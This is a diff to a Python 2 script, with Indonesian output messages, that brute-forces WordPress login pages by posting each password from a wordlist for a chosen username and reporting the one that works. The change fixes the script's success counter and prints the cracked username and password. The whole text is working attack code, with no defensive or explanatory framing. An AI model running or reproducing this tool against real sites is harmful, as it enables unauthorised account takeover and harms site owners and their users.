@@ -25,6 +25,8 @@ if(platform.system() == "Linux"):
 if(platform.system() == "Windows"):
 	subprocess.Popen("cls")
 
+found = 0
+
 for line in file.read().split("\n"):
 	if line.strip():
 		data = {'log':username,'pwd':line,'wp-submit':'Login'}
@@ -32,18 +34,15 @@ for line in file.read().split("\n"):
 		x = r.text
 		print "-"*70
 		print r.url+"\nUsername : \33[33m"+username+"\33[0m|Password : \33[33m"+line+"\33[0m"
-		def error():
-			if x.find(errormsg) == -1:
-				print "\33[31mDitemukan: \33[0m"
-				print "Username : \33[31m"+username+"\33[0m|Password : \33[31m"+line+"\33[0m"
 		if x.find(errormsg) == -1:
 			print "\33[92mDitemukan\33[0m"
-		else:
-			found = 0
+			found += 1
+			z = "Username : \33[31m"+username+"\33[0m|Password : \33[31m"+line+"\33[0m"
 		print "-"*70
 if(found == 0):
-	print "\33[91mTidak dapat ditemukan\33[0m"
-error()
+	print "\33[31mTidak ditemukan\33[0m"
+else:
+	print "\33[92mKetemu:\33[0m"
+	print z
+
 file.close()
-#print r.headers
-#print r.text
